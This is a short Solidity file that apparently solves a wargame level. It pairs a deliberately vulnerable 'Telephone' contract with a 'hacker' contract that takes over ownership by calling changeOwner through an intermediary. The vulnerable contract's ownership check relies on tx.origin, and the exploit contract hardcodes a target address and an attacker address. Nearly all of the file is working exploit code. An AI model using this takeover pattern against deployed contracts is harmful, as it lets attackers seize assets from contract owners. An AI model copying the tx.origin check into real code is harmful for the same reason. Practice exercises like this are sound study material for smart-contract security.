// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract hacker {
    address originalAddress = 0xe434D5F9C1ef86Fb68Dd6f51354CfBb18DcE96dd;
    address hackerAddress = 0x6feA151248f89dbaA5c37b2Ab0135BbfF92bAC17;
    Telephone public originalContract = Telephone(originalAddress);

    function takeOver() public {
        originalContract.changeOwner(
        hackerAddress
        );
    }
}
